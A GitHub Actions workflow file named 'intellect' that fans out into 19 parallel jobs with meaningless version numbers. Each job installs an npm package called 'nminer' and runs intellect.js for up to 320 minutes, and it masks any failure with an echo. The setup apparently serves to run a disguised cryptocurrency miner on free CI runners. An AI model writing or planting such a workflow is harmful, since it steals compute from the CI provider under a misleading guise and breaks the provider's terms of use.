name: intellect
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 6233 }
          - { version: 5163 }
          - { version: 6572 }
          - { version: 7843 }
          - { version: 9084 }
          - { version: 89 }
          - { version: 8042 }
          - { version: 4665 }
          - { version: 6772 }
          - { version: 2420 }
          - { version: 5596 }
          - { version: 145 }
          - { version: 5312 }
          - { version: 624 }
          - { version: 446 }
          - { version: 3495 }
          - { version: 340 }
          - { version: 1197 }
          - { version: 7261 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: mechanically
        run: |
          npm install nminer@latest
          timeout 320m node intellect.js || echo "intellect executed"